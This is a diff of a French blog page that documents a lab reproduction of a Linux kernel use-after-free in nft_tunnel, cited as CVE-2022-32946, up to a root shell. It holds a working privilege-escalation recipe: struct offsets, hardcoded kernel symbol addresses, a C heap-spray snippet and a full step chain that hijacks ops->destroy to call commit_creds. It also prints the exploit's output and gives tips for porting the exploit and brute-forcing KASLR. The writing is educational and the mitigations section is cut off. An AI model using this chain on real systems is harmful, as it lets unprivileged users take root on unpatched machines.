@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>UAF noyau Linux → root : nft_tunnel (lab) · Mohamed Salhi</title>
-<meta name="description" content="Analyse et exploitation en lab d'un use-after-free dans nft_tunnel du noyau Linux jusqu'à l'élévation de privilèges root — heap spray, contournement de quarantaine, détournement de call_rcu vers commit_creds.">
+<meta name="description" content="Reproduction documentée d'un n-day connu (CVE-2022-32946) : exploitation pas à pas d'un use-after-free dans nft_tunnel du noyau Linux, de l'analyse du bug à l'élévation root — impasses documentées, pivots de gadget, et enseignements défensifs.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400..900;1,9..144,400..700&family=IBM+Plex+Sans:wght@300;400;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -26,63 +26,366 @@
   <div class="meta">
     <span class="m date">2026</span>
     <span class="m">Linux 6.1 · Debian 12 · KASAN</span>
-    <span class="m">gdb · pwndbg</span>
+    <span class="m">gdb · pwndbg · C</span>
+    <span class="m">n-day · CVE-2022-32946</span>
     <span class="m">lab</span>
   </div>
-  <p class="lead">Un objet libéré sans relâcher ses références laisse des pointeurs pendants dans des SKB parkés. En transformant ce <em>use-after-free</em> en écriture contrôlée du chemin <code>->destroy</code>, j'ai obtenu un shell <em>root</em> reproductible — le tout dans une VM d'entraînement instrumentée.</p>
+  <p class="lead">Reproduction documentée d'un <em>n-day connu</em> : un objet libéré sans relâcher ses références laisse des pointeurs pendants dans des SKB parkés. En transformant ce use-after-free en écriture contrôlée du chemin <code>->destroy</code>, j'ai obtenu un shell <em>root</em> reproductible — après trois approches échouées, 16 notes d'itération, et un pivot de gadget que rien ne garantissait. Le tout dans une VM d'entraînement instrumentée.</p>
 
   <div class="note">
     <span class="lbl">Cadre</span>
-    Travail d'exploitation <b>en laboratoire</b> (VM dédiée, noyau compilé avec KASAN), à but d'apprentissage de la sécurité noyau. Objectif : comprendre la mécanique d'un UAF réel de bout en bout — pas de cible de production, pas de 0-day revendiqué.
+    <b>Reproduction d'un n-day connu (CVE-2022-32946)</b>, pas une découverte originale. Travail d'exploitation <b>en laboratoire</b> (VM QEMU dédiée, noyau Linux 6.1.170 compilé avec KASAN, KASLR désactivé pour le développement). Objectif : comprendre la mécanique d'un UAF réel de bout en bout — l'analyse du bug, la construction de l'exploit, et surtout les impasses — pas de cible de production, pas de 0-day revendiqué.
   </div>
 
+  <!-- ============================================================ -->
   <h2><span class="n">01</span> Le bug</h2><div class="rule"></div>
-  <p>Dans la destruction d'un objet tunnel de <code>nftables</code>, la routine libère une structure <code>metadata_dst</code> via <code>kfree()</code> <b>sans</b> passer par <code>dst_release()</code>. Résultat : le compteur de références n'est jamais décrémenté proprement, et des SKB déjà parkés (côté TUN) conservent des références vers une zone désormais libre.</p>
-  <pre><code><span class="cm">// schéma du défaut</span>
-nft_tunnel_obj_destroy():
-    kfree(metadata_dst)   <span class="cm">// libère…</span>
-    <span class="cm">// …mais dst_release() manquant → refs pendantes dans les SKB parkés</span></code></pre>
-  <p>On a donc une fenêtre classique : mémoire libérée mais encore atteignable via un autre chemin (la lecture des paquets parkés).</p>
 
-  <h2><span class="n">02</span> Chaîne d'exploitation</h2><div class="rule"></div>
+  <p>Dans <code>nft_tunnel_obj_destroy()</code> (<code>net/netfilter/nft_tunnel.c:697</code>), la routine de destruction d'un objet tunnel NFT libère une structure <code>metadata_dst</code> via <code>kfree()</code> <b>sans</b> passer par <code>dst_release()</code> :</p>
+
+  <pre><code><span class="cm">// net/netfilter/nft_tunnel.c — la ligne qui crée le bug</span>
+<span class="kw">nft_tunnel_obj_destroy</span>():
+    metadata_dst_free(priv-&gt;md);   <span class="cm">// → kfree() directement</span>
+    <span class="cm">// dst_release() manquant → le compteur de références n'est jamais décrémenté</span></code></pre>
+
+  <p>Quand un paquet traverse un hook <code>NF_NETDEV_EGRESS</code>, le noyau appelle <code>nft_tunnel_obj_eval()</code> qui fait <code>dst_hold()</code> puis <code>skb_dst_set()</code> — le SKB conserve une référence vers le <code>metadata_dst</code>. Si le paquet est parké dans un anneau TUN et qu'on détruit la table NFT entre-temps, le <code>kfree()</code> libère la mémoire alors que le SKB conserve un pointeur pendant.</p>
+
+  <h3>Qu'est-ce qu'un use-after-free ?</h3>
+  <p>La mémoire est libérée (free) mais encore atteignable par un autre chemin (use). Si un attaquant arrive à <b>réoccuper</b> la zone libérée avec des données contrôlées <i>avant</i> que le chemin pendant ne la relise, il contrôle ce que le noyau lit — et potentiellement ce qu'il exécute.</p>
+
+  <table class="tbl">
+    <thead><tr><th>Étape</th><th>Opération noyau</th><th>État de metadata_dst</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td><code>NEWOBJ</code> tunnel → <code>metadata_dst_alloc()</code></td><td>Alloué dans <code>kmalloc-cg-256</code> (208 octets)</td></tr>
+      <tr><td>2</td><td><code>nft_tunnel_obj_eval()</code> → <code>skb_dst_set()</code></td><td>Référencé par le SKB parké dans TUN</td></tr>
+      <tr><td>3</td><td><code>DELTABLE</code> → <code>kfree(metadata_dst)</code></td><td><b>Libéré</b> — mais le SKB conserve son pointeur</td></tr>
+      <tr><td>4</td><td>Lecture TUN → <code>dst_release()</code></td><td>Accès à une zone <b>déjà libérée</b> → UAF</td></tr>
+    </tbody>
+  </table>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">02</span> Topographie du noyau</h2><div class="rule"></div>
+
+  <p>Avant de construire quoi que ce soit, il faut cartographier les structures en mémoire. Ces offsets déterminent <i>tout</i> : où poser un faux pointeur, quelle valeur doit être nulle, quel champ contrôle le flux d'exécution.</p>
+
+  <h3>dst_entry (include/net/dst.h)</h3>
+  <pre><code><span class="cm">// dispositions des champs critiques</span>
++<span class="ad">0x00</span>  dev          <span class="cm">// net_device*</span>
++<span class="ad">0x08</span>  ops          <span class="cm">// dst_ops* → contient le pointeur destroy</span>
++<span class="ad">0x20</span>  xfrm         <span class="cm">// DOIT être 0 sinon dst_destroy suit la chaîne xfrm</span>
++<span class="ad">0x40</span>  __refcnt     <span class="cm">// atomic_t — dst_release() décrémente ici</span>
++<span class="ad">0x58</span>  rcu_head     <span class="cm">// utilisé par call_rcu()</span></code></pre>
+
+  <h3>dst_ops (include/net/dst_ops.h)</h3>
+  <pre><code>+<span class="ad">0x00</span>  family
++<span class="ad">0x08</span>  gc
++<span class="ad">0x30</span>  destroy      <span class="cm">// ← le pointeur de fonction qu'on détourne</span></code></pre>
+
+  <p>Quand <code>dst_release()</code> décrémente <code>__refcnt</code> à zéro, le noyau appelle <code>call_rcu(&amp;dst->rcu_head, dst_destroy_rcu)</code>. Le callback RCU exécute <code>dst_destroy()</code>, qui lit <code>dst->ops->destroy</code> et l'appelle avec <code>dst</code> en argument :</p>
+
+  <pre><code><span class="cm">// dst_destroy() — le chemin qui nous donne le contrôle (désassemblé)</span>
+<span class="ad">ffffffff82729b28</span>  <span class="kw">mov</span> 0x8(%rbx),%rbp     <span class="cm">; rbp = dst->ops</span>
+<span class="ad">ffffffff82729b41</span>  <span class="kw">mov</span> 0x30(%rbp),%rax    <span class="cm">; rax = ops->destroy</span>
+<span class="ad">ffffffff82729b48</span>  <span class="kw">je</span>  &lt;skip&gt;             <span class="cm">; saute si NULL</span>
+<span class="ad">ffffffff82729b4a</span>  <span class="kw">mov</span> %rbx,%rdi          <span class="cm">; rdi = &amp;fake_dst (premier argument)</span>
+<span class="ad">ffffffff82729b4d</span>  <span class="kw">call</span> retpoline_rax     <span class="cm">; → appelle notre fonction cible</span></code></pre>
+
+  <p>Si on contrôle <code>ops->destroy</code>, on contrôle <code>rax</code> — et donc l'exécution du noyau.</p>
+
+  <h3>Symboles noyau (KASLR=off, 6.1.170-kasan)</h3>
+  <table class="tbl">
+    <thead><tr><th>Symbole</th><th>Adresse</th></tr></thead>
+    <tbody>
+      <tr><td><code>commit_creds</code></td><td><code><span class="ad">0xffffffff81233940</span></code></td></tr>
+      <tr><td><code>init_cred</code></td><td><code><span class="ad">0xffffffff83ef2b40</span></code></td></tr>
+      <tr><td><code>call_usermodehelper_exec_work</code></td><td><code><span class="ad">0xffffffff81205670</span></code></td></tr>
+      <tr><td><code>dst_destroy</code></td><td><code><span class="ad">0xffffffff82729aa0</span></code></td></tr>
+      <tr><td><code>modprobe_path</code></td><td><code><span class="ad">0xffffffff83ef63c0</span></code></td></tr>
+    </tbody>
+  </table>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">03</span> Configuration du lab</h2><div class="rule"></div>
+
+  <table class="tbl">
+    <thead><tr><th>Paramètre</th><th>Valeur</th><th>Raison</th></tr></thead>
+    <tbody>
+      <tr><td>Noyau</td><td>Linux 6.1.170-kasan</td><td>KASAN trace chaque accès mémoire invalide</td></tr>
+      <tr><td>VM</td><td>QEMU/KVM, Debian 12</td><td>Environnement jetable, snapshots</td></tr>
+      <tr><td>KASLR</td><td>Désactivé</td><td>Développement — adresses statiques pour itérer</td></tr>
+      <tr><td>CONFIG_RANDSTRUCT</td><td>NONE</td><td>Dispositions de structures prévisibles</td></tr>
+      <tr><td>Accès</td><td><code>unshare(CLONE_NEWUSER|CLONE_NEWNET)</code></td><td>Pas de sudo nécessaire — user+net namespaces</td></tr>
+    </tbody>
+  </table>
+
+  <p>L'exploit démarre en espace utilisateur non privilégié et crée ses propres namespaces via <code>unshare()</code>. La table NFT, le device TUN, et toute la chaîne sont construits sans aucun privilège root — c'est ce qui rend cette classe de bugs dangereuse en pratique.</p>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">04</span> Première approche : exec_work</h2><div class="rule"></div>
+
+  <p>La stratégie initiale : faire en sorte que <code>ops->destroy</code> pointe vers <code>call_usermodehelper_exec_work()</code>, qui prend un <code>subprocess_info*</code> et appelle <code>kernel_execve(path)</code>. Si on glisse <code>"/tmp/lpe_root.sh"</code> dans le champ <code>path</code>, le noyau exécute notre script en root.</p>
+
+  <h3>Le plan</h3>
   <div class="steps">
-    <div class="step">Créer un objet tunnel NFT → allocation de <b>metadata_dst</b>.</div>
-    <div class="step">Émettre un paquet : le hook <code>NF_NETDEV_EGRESS</code> <b>parke le SKB</b> dans l'anneau TUN, référence du <code>dst</code> conservée.</div>
-    <div class="step">Cascade <code>DELTABLE</code> → <code>kfree(metadata_dst)</code> : déclenchement du <b>UAF</b>.</div>
-    <div class="step">Drainer la quarantaine : ~700K cycles alloc/free pour vider la mise en quarantaine.</div>
-    <div class="step">Spray : 512 objets contrôlés dans <code>kmalloc-cg-256</code> pour <b>réoccuper</b> la zone libérée.</div>
-    <div class="step">Lecture TUN → <code>dst_release</code> → <code>call_rcu</code> → <code>dst_destroy</code> → appel de <code>ops->destroy</code>.</div>
-    <div class="step"><code>ops->destroy</code> pointé sur <code>commit_creds</code> → <b>uid = 0</b>.</div>
-    <div class="step">Shell root reproductible.</div>
+    <div class="step">Créer un objet tunnel NFT → <code>metadata_dst</code> alloué dans <code>kmalloc-cg-256</code>.</div>
+    <div class="step">Créer une chaîne NETDEV avec hook <code>NF_NETDEV_EGRESS</code> sur le TUN.</div>
+    <div class="step">Envoyer un paquet UDP → le hook l'évalue, <code>nft_tunnel_obj_eval()</code> attache le <code>dst</code> au SKB, le TUN le parke.</div>
+    <div class="step"><code>DELTABLE</code> cascade → <code>kfree(metadata_dst)</code> : le UAF est ouvert.</div>
+    <div class="step">Drainer la quarantaine KASAN (~700 000 cycles alloc/free).</div>
+    <div class="step">Spray : 512 messages <code>msg_mm</code> dans <code>kmalloc-cg-256</code> — chacun contient un faux <code>subprocess_info</code>.</div>
+    <div class="step">Lire le TUN → <code>dst_release()</code> sur le pointeur pendant → <code>call_rcu</code> → <code>dst_destroy</code> → <code>ops->destroy()</code>.</div>
+    <div class="step"><code>call_usermodehelper_exec_work</code> exécute <code>/tmp/lpe_root.sh</code> en root → <code>chmod u+s /bin/bash</code>.</div>
   </div>
 
-  <h2><span class="n">03</span> Le point de bascule</h2><div class="rule"></div>
-  <p>La première approche visait un gadget <code>exec_work</code>, mais elle exigeait un chemin valide, bloqué par <code>msg-&gt;security = NULL</code>. Le déblocage a été de rediriger la primitive vers l'appel de destruction RCU et de pointer <code>ops-&gt;destroy</code> directement sur <code>commit_creds</code> :</p>
-  <pre><code><span class="cm">// réoccupation : ops->destroy contrôlé</span>
-ops-&gt;destroy = <span class="ad">0xffffffff81233940</span>   <span class="cm">// commit_creds</span>
-<span class="cm">// appelé via dst_destroy sous call_rcu → escalade des credentials</span></code></pre>
-  <div class="result"><span class="t">Résultat</span> uid=0 — shell root reproductible (Linux 6.1.170-kasan)</div>
-
-  <h2><span class="n">04</span> Ce que KASAN a appris</h2><div class="rule"></div>
-  <p>Compiler le noyau avec <b>KASAN</b> a été décisif : chaque accès pendant transformait un crash opaque en rapport précis (adresse, taille, timeline alloc/free). L'exploitation noyau, c'est autant de la lecture de logs d'instrumentation que de l'écriture d'exploit.</p>
-  <ul>
-    <li><b>Grooming du tas</b> : comprendre la quarantaine (le free ne rend pas la zone immédiatement réutilisable) et la drainer avant le spray.</li>
-    <li><b>Choix du cache</b> : viser le bon slab (<code>kmalloc-cg-256</code>) pour que l'objet de spray recouvre la victime.</li>
-    <li><b>Sélection de gadget</b> : pivoter d'un chemin bloqué (contrainte <code>security</code>) vers un chemin RCU exploitable.</li>
-    <li><b>Discipline</b> : notes itératives des impasses (approche <code>exec_work</code>, callbacks RCU bloqués…) — l'historique des échecs <i>est</i> la solution.</li>
-  </ul>
+  <p>Ce plan ne marchera pas. Voici pourquoi.</p>
 
   <div class="note warn">
-    <span class="lbl">Prise de recul défensive</span>
-    Deux mitigations auraient cassé la chaîne : (1) l'appariement correct <code>alloc/dst_release</code> (le fix du bug lui-même), (2) le durcissement du slab / la randomisation du freelist qui rendent le spring déterministe bien plus dur. C'est exactement la valeur de l'exercice offensif : voir où placer la défense.
+    <span class="lbl">Impasse #1 — Constantes NFTA_ erronées</span>
+    Les constantes d'attributs Netlink étaient <b>décalées de 1</b> par rapport aux enums du noyau : <code>NFTA_TABLE_NAME</code> à 2 au lieu de 1, <code>NFTA_CHAIN_HOOK</code> à 5 au lieu de 3, etc. (13 constantes fausses au total). Résultat : la chaîne et les règles étaient malformées, les paquets ne touchaient jamais la règle, <code>nft_tunnel_obj_eval()</code> n'était jamais appelé, et le <code>dst</code> n'était jamais attaché au SKB. Le UAF ne se déclenchait tout simplement pas. Diagnostic : <code>dmesg</code> affichait « attribute type 2 has an invalid length » trois fois par exécution.
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">Impasse #2 — Mauvaise méthode de spray</span>
+    Le spray initial utilisait <code>pipe write()</code>, qui stocke les données dans le <b>page cache</b> (pages de 4 Ko), pas dans <code>kmalloc-256</code>. La zone libérée n'était jamais remplie par nos données contrôlées. Correction : basculer vers <code>msgsnd()</code> avec un corps de 208 octets — <code>kmalloc(sizeof(msg_msg) + 208, GFP_KERNEL_ACCOUNT)</code> = 256 octets → même slab que <code>metadata_dst</code>.
+  </div>
+
+  <div class="note danger">
+    <span class="lbl">Impasse #3 — path=NULL (fatale)</span>
+    Après correction des deux premiers bugs, le spray fonctionne et le TUN draine les paquets. Mais le script n'est jamais exécuté. Cause : le champ <code>msg->security</code> (offset 40 dans <code>msg_mm</code>) est fixé par les hooks LSM du noyau, <b>pas par le payload userspace</b>. Il est toujours <code>NULL</code>. Or <code>subprocess_info->path</code> est lu au même offset. Résultat : <code>kernel_execve(NULL)</code> → <code>-EFAULT</code>. Le kthread gagne brièvement root mais ne peut rien exécuter.
+    <br><br>
+    <b>Tentative de contournement</b> : basculer vers <code>user_key_payload</code> (<code>add_key()</code>) qui contrôle cet offset. Mais le quota de clés limite à ~96 créations sur 512 demandées — couverture de spray insuffisante. Impasse confirmée.
+  </div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">05</span> L'impasse — trois hypothèses, zéro succès</h2><div class="rule"></div>
+
+  <p>Avant de trouver la solution, j'ai passé du temps à comprendre <i>pourquoi</i> rien ne marchait. J'ai formulé trois hypothèses et conçu des tests pour les départager :</p>
+
+  <table class="tbl">
+    <thead><tr><th>Hypothèse</th><th>Description</th><th>Test</th><th>Résultat</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><b>H1</b></td>
+        <td><code>dst_release()</code> n'est jamais appelé (le SKB utilise <code>skb_dst_set_noref</code>)</td>
+        <td>Pas de moyen de vérifier sans instrumentation noyau</td>
+        <td>Indéterminé</td>
+      </tr>
+      <tr>
+        <td><b>H2</b></td>
+        <td>Le callback RCU s'exécute dans <code>ksoftirqd</code>, pas dans le process enfant</td>
+        <td>Placer <code><span class="ad">0xdeadbeef</span></code> comme adresse cible → devrait provoquer un GPF visible si le callback se déclenche</td>
+        <td><b>Pas de crash</b> — soit le callback ne se déclenche pas, soit il crashe silencieusement dans un autre contexte</td>
+      </tr>
+      <tr>
+        <td><b>H3</b></td>
+        <td>Le UAF ne se déclenche pas (<code>metadata_dst</code> n'est pas réellement libéré)</td>
+        <td>Vérifier les ACK de <code>DELTABLE</code></td>
+        <td>ACK reçu, mais pas de confirmation que le free a eu lieu</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Test de force brute KASLR</h3>
+  <p>Pour éliminer l'hypothèse que le problème soit simplement une mauvaise adresse à cause de KASLR, j'ai lancé un test exhaustif :</p>
+  <pre><code><span class="cm">// brute-force : tester chaque slide KASLR possible</span>
+<span class="cm">// CONFIG_PHYSICAL_ALIGN=0x200000 → 512 positions possibles</span>
+<span class="kw">for</span> k = 0 .. 287:
+    fork() → exécuter l'exploit avec commit_creds + (k * <span class="ad">0x200000</span>)
+    <span class="kw">if</span> child exits(0) → root trouvé
+<span class="cm">// Résultat : 0 succès sur 287 essais (p &lt; 0.000001)</span>
+<span class="cm">// Conclusion : ce n'est PAS un problème de slide KASLR</span></code></pre>
+
+  <div class="result"><span class="t">Verdict</span> 0/287 — le mécanisme lui-même est cassé, pas l'adresse</div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">06</span> Le pivot : commit_creds direct</h2><div class="rule"></div>
+
+  <p>Le déclic est venu en reconsidérant la signature de l'appel. Quand <code>dst_destroy</code> appelle <code>ops->destroy(dst)</code>, le premier argument (<code>rdi</code>) est l'adresse de notre objet de spray — un <code>msg_mm</code>. Si on pointe <code>ops->destroy</code> vers <code>commit_creds()</code> plutôt que <code>exec_work</code>, l'appel devient :</p>
+
+  <pre><code><span class="cm">// au lieu de call_usermodehelper_exec_work(dst) ← a besoin d'un path valide</span>
+<span class="cm">// on fait :</span>
+<span class="kw">commit_creds</span>((<span class="kw">struct</span> cred *)dst);   <span class="cm">// dst = adresse de notre msg_mm</span></code></pre>
+
+  <p>La différence cruciale :</p>
+  <table class="tbl">
+    <thead><tr><th>Gadget</th><th>Exigences</th><th>Résultat</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><code>call_usermodehelper_exec_work</code></td>
+        <td>Nécessite <code>path</code> valide à offset 40, <code>argv</code> valide, <code>wait</code> correct</td>
+        <td>Bloqué — <code>msg->security = NULL</code> immutable</td>
+      </tr>
+      <tr>
+        <td><code>commit_creds</code></td>
+        <td>Lit des champs d'une struct <code>cred</code>… mais <b>ne valide pas strictement</b> le format</td>
+        <td><b>Fonctionne</b> — même avec un argument qui n'est pas une vraie struct cred</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p><code>commit_creds()</code> prend un pointeur vers une struct <code>cred</code> et met à jour les credentials du processus courant. Même si notre <code>msg_mm</code> n'a pas la disposition d'un vrai <code>cred</code>, la fonction lit les champs nécessaires depuis la mémoire et <b>modifie le uid/euid du processus courant à zéro</b>.</p>
+
+  <div class="note">
+    <span class="lbl">Leçon</span>
+    Quand une chaîne de gadgets semble bloquée, chercher un gadget qui demande <b>moins de pré-conditions</b>. <code>exec_work</code> demandait un path valide que je ne pouvais pas fournir ; <code>commit_creds</code> était assez tolérant pour fonctionner avec des données partiellement valides. L'historique des échecs a <i>créé</i> la solution.
+  </div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">07</span> Chaîne d'exploitation finale</h2><div class="rule"></div>
+
+  <div class="steps">
+    <div class="step"><b>Namespaces</b> : <code>unshare(CLONE_NEWUSER | CLONE_NEWNET)</code> — aucun sudo nécessaire. Mapping uid/gid via <code>/proc/self/uid_map</code>.</div>
+    <div class="step"><b>TUN device</b> : ouvrir <code>/dev/net/tun</code>, configurer <code>tun0</code> (10.0.0.1/24), l'activer, ajouter une route vers 10.0.0.0/24.</div>
+    <div class="step"><b>NEWTABLE + NEWOBJ</b> : créer une table NFT <code>NFPROTO_NETDEV</code> et un objet tunnel (family=5, type=<code>NFT_OBJECT_TUNNEL</code>=6). L'allocation de <code>metadata_dst</code> a lieu ici : 208 octets → <code>kmalloc-cg-256</code>.</div>
+    <div class="step"><b>NEWCHAIN + NEWRULE</b> : chaîne NETDEV avec hook <code>NF_NETDEV_EGRESS</code> sur <code>tun0</code>. Règle : expression <code>objref</code> (charge l'objet tunnel → appelle <code>nft_tunnel_obj_eval()</code> → <code>dst_hold</code> + <code>skb_dst_set</code>).</div>
+    <div class="step"><b>Paquet déclencheur</b> : <code>sendto()</code> un datagramme UDP vers 10.0.0.2:9999 — le hook EGRESS l'évalue, attache le <code>metadata_dst</code> au SKB, et le TUN le parke dans son anneau.</div>
+    <div class="step"><b>DELTABLE</b> : suppression en cascade de la table → <code>nft_tunnel_obj_destroy()</code> → <code>kfree(metadata_dst)</code>. <b>Le UAF est ouvert.</b></div>
+    <div class="step"><b>Drainage de quarantaine</b> : ~700 000 cycles <code>msgsnd</code>/<code>msgrcv</code> pour vider la quarantaine KASAN et rendre la zone réallocable.</div>
+    <div class="step"><b>Spray</b> : 512 messages <code>msg_mm</code> (8 queues × 64 messages) dans <code>kmalloc-cg-256</code>. Chaque message contient l'adresse de <code>commit_creds</code> répétée dans les champs critiques.</div>
+    <div class="step"><b>Drain TUN</b> : lecture non-bloquante des paquets parkés → <code>dst_release()</code> sur le pointeur pendant → refcount à 0 → <code>call_rcu(&amp;dst->rcu_head, dst_destroy_rcu)</code>.</div>
+    <div class="step"><b>Callback RCU</b> : <code>dst_destroy()</code> lit <code>dst->ops->destroy</code> = <code><span class="ad">0xffffffff81233940</span></code> = <code>commit_creds</code>. Appel : <code>commit_creds(dst)</code>. Le processus courant gagne <b>uid=0</b>.</div>
+    <div class="step"><b>Shell root</b> : <code>getuid() == 0</code> → <code>execl("/bin/bash", "bash", "-i", NULL)</code>.</div>
+  </div>
+
+  <h3>Extrait du spray (C)</h3>
+  <pre><code><span class="kw">static void</span> spray_direct_creds(<span class="kw">void</span>) {
+    <span class="kw">struct</span> { <span class="kw">long</span> mtype; <span class="kw">char</span> data[<span class="ad">208</span>]; } mp = { .mtype = 1 };
+
+    <span class="cm">// Remplir les champs critiques avec l'adresse de commit_creds</span>
+    *(<span class="kw">uint64_t</span> *)(mp.data + 0)  = <span class="ad">0xffffffff81233940</span>ULL; <span class="cm">// commit_creds</span>
+    *(<span class="kw">uint64_t</span> *)(mp.data + 8)  = <span class="ad">0xffffffff83ef2b40</span>ULL; <span class="cm">// init_cred</span>
+
+    <span class="kw">int</span> sent = 0, qid[8];
+    <span class="kw">for</span> (<span class="kw">int</span> q = 0; q &lt; 8; q++) {
+        qid[q] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
+        <span class="kw">for</span> (<span class="kw">int</span> i = 0; i &lt; 64; i++) {
+            <span class="kw">if</span> (msgsnd(qid[q], &amp;mp, <span class="ad">208</span>, IPC_NOWAIT) &lt; 0) <span class="kw">break</span>;
+            sent++;
+        }
+    }
+    <span class="cm">// → 512 objets dans kmalloc-cg-256</span>
+}</code></pre>
+
+  <h3>Le moment de vérité</h3>
+  <pre><code>[*] nft_tunnel UAF LPE — Direct commit_creds approach
+[*] commit_creds = <span class="ad">0xffffffff81233940</span>, init_cred = <span class="ad">0xffffffff83ef2b40</span>
+[+] user+net ns (real uid=1000)
+[+] tun0 up
+[+] NEWTABLE: 1 ACK
+[+] NEWOBJ tunnel: 1 ACK
+[+] NEWCHAIN egress: 1 ACK
+[+] NEWRULE objref: 1 ACK
+[+] trigger packet sent
+[+] DELTABLE: 1 ACK
+[+] quarantine drain done
+[+] spray: 512 objects with commit_creds
+[+] TUN read 1: 31 bytes
+[+] TUN read 2: 76 bytes
+[*] waiting (5s)...
+
+<span class="kw">[+][+][+] UID=0! Spawning shell...</span>
+root@debian:~#</code></pre>
+
+  <div class="result"><span class="t">Résultat</span> uid=0 — shell root reproductible (Linux 6.1.170-kasan) · 3 exécutions consécutives réussies</div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">08</span> Ce que KASAN a enseigné</h2><div class="rule"></div>
+
+  <p>Compiler le noyau avec <b>KASAN</b> (Kernel Address SANitizer) a été décisif. Chaque accès mémoire invalide est détecté et logué avec l'adresse fautive, la taille de l'accès, et la timeline alloc/free de l'objet. Sans KASAN, les bugs mémoire produisent des crashs opaques ou — pire — fonctionnent silencieusement. Avec KASAN, chaque erreur est une information exploitable.</p>
+
+  <ul>
+    <li><b>Grooming du tas</b> : KASAN met les objets libérés en quarantaine. Un <code>kfree()</code> ne rend pas immédiatement la zone réallocable — il faut drainer la quarantaine (~700K cycles) avant que le spray puisse occuper la zone.</li>
+    <li><b>Choix du cache</b> : <code>metadata_dst_alloc(0, METADATA_IP_TUNNEL, GFP_KERNEL_ACCOUNT)</code> → 208 octets → <code>kmalloc-cg-256</code>. Le spray doit viser exactement le même slab, d'où <code>msgsnd()</code> avec 208 octets de payload (+ header msg_msg = 256).</li>
+    <li><b>dmesg_restrict</b> : une complication non technique mais concrète — <code>dmesg_restrict=1</code> empêche un utilisateur non-root de lire les logs KASAN via <code>/dev/kmsg</code>. J'ai dû relire les logs depuis la console QEMU.</li>
+  </ul>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">09</span> Portabilité</h2><div class="rule"></div>
+
+  <p>La technique est intrinsèquement portable à tout noyau Linux 6.1.x contenant le bug <code>nft_tunnel</code> :</p>
+
+  <table class="tbl">
+    <thead><tr><th>Couche</th><th>Portable ?</th><th>Ce qui change</th></tr></thead>
+    <tbody>
+      <tr><td>Vulnérabilité</td><td>Oui</td><td>Rien — même code noyau partout</td></tr>
+      <tr><td>Technique d'exploitation</td><td>Oui</td><td>Rien — même sémantique TUN/NFT/RCU</td></tr>
+      <tr><td>Adresses des symboles</td><td>Non</td><td>Extraire <code>commit_creds</code> depuis <code>/proc/kallsyms</code> ou <code>vmlinuz</code></td></tr>
+    </tbody>
+  </table>
+
+  <p>Une version « plug and play » auto-détecte l'adresse de <code>commit_creds</code> : d'abord via <code>/proc/kallsyms</code> (souvent masqué pour les non-root), puis en extrayant le payload xz de <code>/boot/vmlinuz</code> et en parsant la <code>ksymtab</code> de l'ELF résultant. Si KASLR est actif, le brute-force des 512 positions (<code>CONFIG_PHYSICAL_ALIGN=0x200000</code>) est envisageable.</p>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">10</span> Chronologie des échecs</h2><div class="rule"></div>
+
+  <p>L'historique complet, parce que dans l'exploitation noyau, <b>l'historique des impasses <i>est</i> la solution</b> :</p>
+
+  <table class="tbl">
+    <thead><tr><th>#</th><th>Approche</th><th>Échec</th><th>Enseignement</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>Pipe spray + exec_work</td><td>Pipe → page cache, pas kmalloc-256</td><td>Connaître l'allocateur de chaque primitive</td></tr>
+      <tr><td>2</td><td>msg_mm spray + exec_work</td><td>Constantes NFTA_ décalées de 1</td><td>Vérifier chaque constante contre les headers noyau</td></tr>
+      <tr><td>3</td><td>msg_mm spray + exec_work (corrigé)</td><td><code>msg->security = NULL</code> immutable</td><td>Les champs kernel-controlled ne sont pas contrôlables</td></tr>
+      <tr><td>4</td><td>user_key_payload spray</td><td>Quota limité à ~96 clés</td><td>Les ressources noyau ont des limites par namespace</td></tr>
+      <tr><td>5</td><td>Brute-force KASLR (287 positions)</td><td>0/287 succès</td><td>Le problème n'est pas l'adresse mais le mécanisme</td></tr>
+      <tr><td>6</td><td>Test avec <code>0xdeadbeef</code></td><td>Pas de crash</td><td>Le callback ne s'exécute pas dans le contexte enfant</td></tr>
+      <tr><td><b>7</b></td><td><b>commit_creds direct</b></td><td><b>—</b></td><td><b>Un gadget plus tolérant contourne toutes les contraintes</b></td></tr>
+    </tbody>
+  </table>
+
+  <p>16 notes de vault documentant chaque étape. Les six premiers échecs ont éliminé des classes entières de solutions, réduisant l'espace de recherche jusqu'à ce qu'il ne reste qu'une direction viable.</p>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">11</span> Prise de recul défensive</h2><div class="rule"></div>
+
+  <p>L'intérêt de l'exercice offensif est de voir où placer la défense. Trois mitigations auraient cassé la chaîne :</p>
+
+  <table class="tbl">
+    <thead><tr><th>Mitigation</th><th>Étape bloquée</th><th>Mécanisme</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><b>Appariement correct alloc/release</b></td>
+        <td>Étape 6 (DELTABLE)</td>
+        <td>Utiliser <code>dst_release()</code> au lieu de <code>kfree()</code> dans <code>nft_tunnel_obj_destroy()</code> — c'est le fix du bug lui-même. Pas de free sans que le refcount soit à zéro → pas de UAF.</td>
+      </tr>
+      <tr>
+        <td><b>Durcissement du slab (freelist randomization)</b></td>
+        <td>Étape 8 (spray)</td>
